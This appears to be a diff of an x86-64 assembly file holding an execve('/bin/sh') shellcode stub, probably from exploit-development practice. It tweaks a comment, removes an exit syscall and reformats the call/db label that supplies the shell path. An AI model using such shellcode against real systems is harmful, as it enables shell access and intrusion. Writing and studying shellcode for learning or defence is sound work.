@@ -16,18 +16,12 @@ mystart:
 	push	rax		    ; push "/bin/sh" onto the stack
 	push	rsp		    ; assign pointer to start of the stack
 	pop 	rsi 		; second parameter - pointer to {"/bin/sh", NULL} 
-	xor 	rax, rax	; clear RAX
+	xor 	rax, rax	; make rax - NULL
 	mov 	al, 0x3b	; syscall number for __execve
 	syscall
 	
-	; exit syscall
-	xor 	rax, rax
-	mov 	al, 0x3c
-	syscall
-	
-	message:
-	
+message:	
 	call 	mystart
-	db 	"/bin/sh"
+	db 	    "/bin/sh"
 	
 section .data
